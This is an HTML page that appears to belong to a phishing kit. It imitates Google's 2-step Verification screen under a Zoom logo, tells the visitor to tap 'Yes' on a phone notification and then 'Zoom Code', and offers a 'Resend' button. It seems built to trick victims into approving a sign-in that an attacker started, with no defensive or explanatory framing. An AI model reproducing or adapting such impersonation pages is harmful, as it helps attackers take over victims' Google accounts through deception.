<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>2-step Verification</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      color: #202124;
      overflow: hidden;
    }

    /* Professional layout container */
    .container {
      width: 100%;
      height: 100dvh;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      padding: 1.5vh 3.5vw 1.2vh 3.5vw;
      background: #ffffff;
      max-width: 440px;
      margin: 0 auto;
    }

    /* Top Section - Aro niche namano ebong tight kora holo */
    .top-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.4vh;
      margin-top: 1.2vh;
    }

    /* Zoom Logo */
    .logo-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 42px;
    }

    .logo {
      height: 34px;
      width: auto;
      object-fit: contain;
    }

    /* Main Heading - Aro boro font */
    h1 {
      font-size: clamp(26px, 6.8vw, 33px);
      font-weight: 500;
      color: #202124;
    }

    /* Subtitle - Aro boro font */
    .subtitle {
      font-size: clamp(16px, 4.5vw, 19.5px);
      color: #5f6368;
      font-weight: 400;
      max-width: 390px;
      line-height: 1.3;
    }

    /* Email Pill Selector box */
    .email-pill {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      padding: 6px 16px;
      border: 1px solid #dadce0;
      border-radius: 20px;
      margin-top: 0.4vh;
      background: #fff;
    }

    .email-pill svg {
      width: 17px;
      height: 17px;
      fill: #1a73e8;
    }

    .email-text {
      font-size: 15px;
      font-weight: 500;
      color: #3c4043;
    }

    .email-pill .arrow {
      font-size: 11px;
      color: #5f6368;
    }

    /* Center Content Wrapper (Phone + Text grouped together) */
    .center-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 1vh;
      margin: auto 0;
    }

    /* Phone Graphic Illustration - Aro onek boro kora holo */
    .phone-illustration {
      width: 80vw;
      max-width: 340px;
      height: auto;
      max-height: 46vh;
      object-fit: contain;
    }

    /* Text Group */
    .text-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.3vh;
    }

    /* Sub Heading - Aro boro font */
    h2 {
      font-size: clamp(23px, 6vw, 29px);
      font-weight: 500;
      color: #202124;
    }

    /* Description Text - Aro boro font */
    .desc-text {
      font-size: clamp(17.5px, 4.8vw, 21.5px);
      font-weight: 400;
      color: #3c4043;
      line-height: 1.35;
    }

    .desc-text span {
      font-weight: 600;
      color: #202124;
    }

    /* Resend / Action Button - Aro opore uthano ebong boro kora holo */
    .btn-join {
      background-color: #1a73e8;
      color: white;
      padding: 14px 0;
      width: 100%;
      max-width: 370px;
      font-size: 18.5px;
      font-weight: 500;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-join:hover {
      background-color: #1557b0;
    }

    .btn-join:active {
      background-color: #174ea6;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="top-section">
      <div class="logo-wrapper">
        <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
      </div>
      <h1>2-step Verification</h1>
      <p class="subtitle">This extra step shows that it’s really you trying to sign in</p>
      
      <div class="email-pill">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
        <span class="email-text">user@gmail.com</span>
        <span class="arrow">▼</span>
      </div>
    </div>

    <!-- Phone illustration and check text grouped together -->
    <div class="center-content">
      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
      <div class="text-group">
        <h2>Check your phone.</h2>
        <p class="desc-text">
          Google sent a notification to your phone.<br>
          <span>Tap Yes</span> on the notification<br>
          Then Tap Zoom Code
        </p>
      </div>
    </div>

    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
  </div>

</body>
</html>
